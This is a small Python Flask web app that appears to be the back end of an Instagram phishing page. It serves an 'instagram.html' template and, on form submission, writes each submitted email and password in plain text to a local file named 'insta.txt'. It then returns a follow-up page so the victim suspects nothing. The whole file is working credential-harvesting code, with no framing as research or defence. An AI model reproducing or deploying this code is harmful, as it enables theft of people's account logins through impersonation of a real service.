from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("instagram.html")

@app.route("/submit" , methods=["POST"])
def submit():
    try:
        email = request.form["email"]
        password = request.form["password"]

        f = open("insta.txt", "a")
        f.write("User: ")
        f.write(email)
        f.write("\t\t")
        f.write("Password: ")
        f.write(password)
        f.close()

        return render_template("insta_ans.html")

    except Exception as ex:
        return f"sorry not successful the error was  : {ex} "



@app.errorhandler(404)
def showError(error):
    return render_template("error_404.html"), 404
